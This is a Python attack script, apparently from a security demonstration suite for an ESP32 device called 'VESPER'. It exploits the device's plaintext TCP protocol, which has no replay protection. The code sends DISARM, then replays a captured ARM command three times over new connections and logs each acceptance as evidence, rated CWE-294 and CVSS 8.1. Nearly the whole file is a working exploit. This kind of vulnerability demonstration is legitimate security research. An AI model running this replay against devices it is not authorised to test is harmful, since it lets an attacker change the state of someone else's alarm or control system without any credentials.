#!/usr/bin/env python3
"""
VESPER ESP32 — Suite 2: Network Attack — Protocol Replay
=========================================================
The VESPER protocol carries no nonce, HMAC, or timestamp.  A plaintext
command sniffed from the wire (or trivially guessed) can be retransmitted
from any host at any time and the device will accept it unconditionally.

This script captures the ARM command, resets the device to DISARMED, then
replays ARM three times over separate TCP connections — each accepted.

  CWE  : CWE-294 — Authentication Bypass by Capture-replay
  CVSS : 8.1 (High)

Run standalone:
    python scripts/attacks/network.py --target 192.168.1.112:15011
"""

import argparse
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from scripts.attacks.common import (
    GREEN, RED, DIM, BOLD, CYAN, RESET,
    reset_clock, tx, rx, state_box, section, divider,
    send, verify_connection, print_result,
)


def attack_network_replay(host: str, port: int) -> dict:
    """
    Reset device to DISARMED, then replay a captured ARM command three times
    over fresh TCP connections — demonstrating there is no replay protection.
    """
    section(
        "Suite 2 — NETWORK ATTACK: Protocol Replay",
        f"Target: {host}:{port}  |  No nonce / no HMAC / no timestamp  |  CWE-294 / CVSS 8.1",
    )

    t0           = time.time()
    evidence: list = []
    captured_cmd = "ARM"

    print(f"  {CYAN}Captured command{RESET} (sniffed from wire):  {BOLD}ARM\\n{RESET}")
    print(f"  {DIM}VESPER sends plain ASCII over TCP — any observer can capture and replay.{RESET}\n")
    evidence.append(f"Captured from wire: '{captured_cmd}\\n'  (no nonce / timestamp)")
    evidence.append("VESPER protocol has no replay protection in any firmware version")

    # ── Step 1: reset to known DISARMED state ────────────────────────────────
    divider("Step 1 — Reset device to known DISARMED state")
    tx("DISARM")
    rx(send(host, port, "DISARM"))
    time.sleep(0.3)
    tx("GET_ARMED")
    before       = send(host, port, "GET_ARMED")
    rx(before)
    before_state = "ARMED" if "ARMED:yes" in before else "DISARMED"
    state_box(before_state)
    evidence.append(f"Device state before replay: {before.strip()}")

    # ── Step 2: replay ×3 ────────────────────────────────────────────────────
    divider("Step 2 — Replay captured ARM packet 3× (no credentials)")
    print(f"  {DIM}Each replay uses a fresh TCP connection — identical to a different attacker host.{RESET}\n")

    accepted      = 0
    current_state = before_state
    for i in range(3):
        print(f"  Replay #{i+1}:")
        tx(captured_cmd)
        resp = send(host, port, captured_cmd)
        rx(resp)
        if "ARMED:yes" in resp or "ACK" in resp:
            accepted      += 1
            current_state  = "ARMED"
            evidence.append(f"Replay #{i+1} ACCEPTED — '{resp.strip()}'")
            print(f"  {GREEN}✓ ACCEPTED — device changed state without authentication{RESET}")
        else:
            evidence.append(f"Replay #{i+1} rejected — '{resp.strip()}'")
            print(f"  {RED}✗ rejected{RESET}")
        state_box(current_state)
        if i < 2:
            time.sleep(0.4)

    # ── Step 3: confirm final state ───────────────────────────────────────────
    divider("Step 3 — Confirm final device state")
    tx("GET_ARMED")
    after = send(host, port, "GET_ARMED")
    rx(after)
    evidence.append(f"Device state after replay: {after.strip()}")

    return {
        "name":        "Protocol Replay Attack",
        "suite":       "Network",
        "severity":    "HIGH",
        "success":     accepted >= 1,
        "evidence":    evidence,
        "duration_ms": (time.time() - t0) * 1000,
        "impact":      f"{accepted}/3 replays accepted — attacker re-triggers any past command indefinitely",
        "cvss":        8.1,
    }


def main():
    parser = argparse.ArgumentParser(
        description="VESPER ESP32 — Suite 2: Network Protocol Replay"
    )
    parser.add_argument("--target", required=True,
                        help="ESP32 address, e.g. 192.168.1.112:15011")
    parser.add_argument("--no-verify", action="store_true",
                        help="Skip connection check")
    args = parser.parse_args()

    parts = args.target.split(":")
    host  = parts[0]
    port  = int(parts[1]) if len(parts) > 1 else 15011

    reset_clock()
    print(f"\n{'='*60}")
    print(f"  Suite 2 — Network Attack  |  {host}:{port}")
    print(f"{'='*60}\n")

    if not args.no_verify and not verify_connection(host, port):
        print("Cannot reach ESP32.\n")
        return 1

    result = attack_network_replay(host, port)
    print_result(result)
    return 0 if result["success"] else 1


if __name__ == "__main__":
    sys.exit(main())
